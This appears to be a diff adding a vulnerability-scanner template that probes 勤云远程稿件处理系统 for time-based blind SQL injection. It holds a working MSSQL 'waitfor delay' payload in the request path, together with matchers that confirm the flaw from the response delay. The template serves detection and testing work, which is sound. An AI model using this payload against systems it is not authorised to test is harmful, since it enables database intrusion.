@@ -1,0 +1,30 @@
+id: poc-yaml-e-tiller-rmps-sqli
+info:
+  name: 勤云远程稿件处理系统 SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 勤云远程稿件处理系统 allowing potential exploitation through blind SQL payloads.
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1)+2}}"
+http:
+  - raw:
+      - |
+        GET /burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:{{t1}}'--/article/abstract/1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "/404.htm"
+          - "抱歉，您找的文章信息不存在或已被删除"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
